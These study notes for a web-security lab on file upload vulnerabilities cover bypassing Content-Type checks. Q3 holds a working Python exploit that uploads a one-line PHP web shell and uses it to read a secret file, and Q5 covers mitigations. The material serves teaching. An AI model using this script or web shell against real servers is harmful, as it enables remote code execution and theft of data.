---
course: Web Security
topic: File Upload Vulnerabilities
tags: [web-security]
---

## Practice Questions & Answers

**Q1. Explain how content-type restrictions can be bypassed in file upload functionalities.**

The content-type restriction in file upload functionalities can be bypassed by manipulating the `Content-Type` header in the HTTP request. Typically, applications validate the `Content-Type` to ensure that only specific file types (like images) are uploaded. By changing the `Content-Type` header to a permitted type (e.g., `image/png`) while still uploading a file with a different extension (e.g., `.php`), the server may accept the file without proper validation. This can lead to the execution of malicious files on the server.

**Q2. How would you exploit a file upload vulnerability that checks the `Content-Type` header?**

To exploit a file upload vulnerability that checks the `Content-Type` header, follow these steps:

1. Identify the file upload functionality in the application.
2. Use a tool like Burp Suite to intercept the HTTP request for file upload.
3. Modify the `Content-Type` header in the intercepted request to match a permitted type (e.g., `image/png`).
4. Attach a malicious file (e.g., a PHP web shell) to the request.
5. Send the modified request to the server. If the server accepts the file based solely on the `Content-Type` header, the malicious file will be uploaded and potentially executable.

**Q3. Write a Python script to automate the exploitation of a file upload vulnerability that checks the `Content-Type` header.**

```python
import requests
from bs4 import BeautifulSoup
import random
from urllib.parse import urljoin
from requests_toolbelt.multipart.encoder import MultipartEncoder

def get_csrf_token(session, url):
    response = session.get(url)
    soup = BeautifulSoup(response.text, 'html.parser')
    csrf_input = soup.find('input', {'name': 'csrf'})
    return csrf_input['value']

def exploit_file_upload(url, username, password):
    session = requests.Session()
    
    # Step 1: Log in
    login_url = urljoin(url, '/login')
    csrf_token = get_csrf_token(session, login_url)
    login_data = {
        'csrf': csrf_token,
        'username': username,
        'password': password
    }
    response = session.post(login_url, data=login_data)
    if 'log out' not in response.text:
        print("Could not log in")
        return
    
    print("Successfully logged in")

    # Step 2: Upload web shell
    account_url = urljoin(url, '/my-account')
    csrf_token = get_csrf_token(session, account_url)
    web_shell_content = """<?php echo shell_exec($_GET['cmd']); ?>"""
    web_shell_filename = 'test.php'
    multipart_form_data = {
        'avatar': (web_shell_filename, web_shell_content, 'image/png'),
        'user': username,
        'csrf': csrf_token
    }
    boundary = ''.join(random.choices('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=16))
    multipart_encoder = MultipartEncoder(fields=multipart_form_data, boundary=boundary)
    headers = {'Content-Type': multipart_encoder.content_type}
    upload_url = urljoin(url, '/my-account/avatar')
    response = session.post(upload_url, data=multipart_encoder, headers=headers)
    if response.status_code != 200:
        print("Failed to upload web shell")
        return
    
    print("Web shell uploaded successfully")

    # Step 3: Execute web shell
    web_shell_url = urljoin(url, f'/my-account/avatar/{web_shell_filename}')
    cmd = 'cat /home/carlos/secret.txt'
    response = session.get(web_shell_url + f'?cmd={cmd}')
    print("Content of the secret file:")
    print(response.text)

# Example usage
exploit_file_upload('http://example.com/', 'username', 'password')
```

**Q4. Explain how the recent CVE-2021-35200 relates to file upload vulnerabilities and content-type restrictions.**

CVE-2021-35200 is related to a file upload vulnerability in the WordPress plugin "WP File Manager." The vulnerability arises due to improper validation of the `Content-Type` header during file uploads. Attackers can exploit this by uploading malicious files (such as PHP shells) by setting the `Content-Type` header to a permitted type (e.g., `image/png`). Once uploaded, these files can be executed on the server, leading to remote code execution. This highlights the importance of validating file content rather than relying solely on the `Content-Type` header for security.

**Q5. How would you configure a server to mitigate content-type restriction bypass attacks in file upload functionalities?**

To mitigate content-type restriction bypass attacks in file upload functionalities, consider the following configurations:

1. **Validate File Extensions**: Ensure that the file extension matches the expected type (e.g., `.jpg`, `.png`).
2. **Check MIME Types**: Use libraries to check the actual MIME type of the file, not just the `Content-Type` header.
3. **Limit Upload Directory**: Restrict the directory where uploaded files can be stored to prevent overwriting critical files.
4. **Use Content Sniffing**: Implement content sniffing to detect the actual content of the file and compare it with the expected type.
5. **Disable Execution Permissions**: Ensure that the directory where files are uploaded does not have execution permissions enabled.

By implementing these measures, you can significantly reduce the risk of content-type restriction bypass attacks.

---
<!-- nav -->
[[Web Security (PortSwigger)/18-File Upload Vulnerabilities/03-Lab 2 Web shell upload via Content Type restriction bypass/05-File Upload Vulnerabilities|File Upload Vulnerabilities]] | [[Web Security (PortSwigger)/18-File Upload Vulnerabilities/03-Lab 2 Web shell upload via Content Type restriction bypass/00-Overview|Overview]]
